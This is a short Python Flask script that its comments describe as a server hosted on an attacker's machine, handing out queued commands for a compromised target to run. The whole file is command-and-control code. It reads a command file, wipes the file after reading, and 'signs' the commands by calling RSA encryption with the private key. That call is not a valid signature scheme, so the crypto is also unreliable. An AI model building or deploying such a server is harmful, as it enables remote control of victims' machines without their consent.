# flask server to host on attackers machine
# Provides an endpoint which will return a list of commands to run on the target machine

import flask, rsa
from Crypto.PublicKey import RSA

app = flask.Flask(__name__)

file_path = "commands.txt"
private_key_name = "rsa.private"

@app.route('/commands', methods=['GET'])
def commands():
    # return commands from file to run on target machine
    with open(file_path, 'r') as f:
        commands = f.read()

    # deletes commands from file after they are read
    with open(file_path, 'w') as f:
        f.write('')

    # sign commands with private key
    private_key = RSA.importKey(open(private_key_name, 'rb').read())
    signed_commands = private_key.encrypt(commands.encode(), 32)[0]

    return signed_commands